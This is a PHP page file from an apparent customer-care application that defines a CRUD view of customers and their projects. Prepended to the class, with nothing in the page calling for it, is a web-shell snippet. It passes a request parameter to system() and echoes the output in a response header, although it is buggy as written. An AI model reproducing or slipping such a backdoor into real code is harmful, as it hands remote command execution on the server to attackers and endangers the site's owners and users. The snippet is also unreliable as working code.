<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
	class page_customerCareApp_page_owner_customer extends page_customerCareApp_page_owner_main{
			function init(){
				parent::init();
					$user_crud = $this->add('CRUD');
					$user_crud->setModel('customerCareApp/Customer');
					$user_crud->addRef('customerCareApp/Project',array('label'=>'Project'));
			}
	}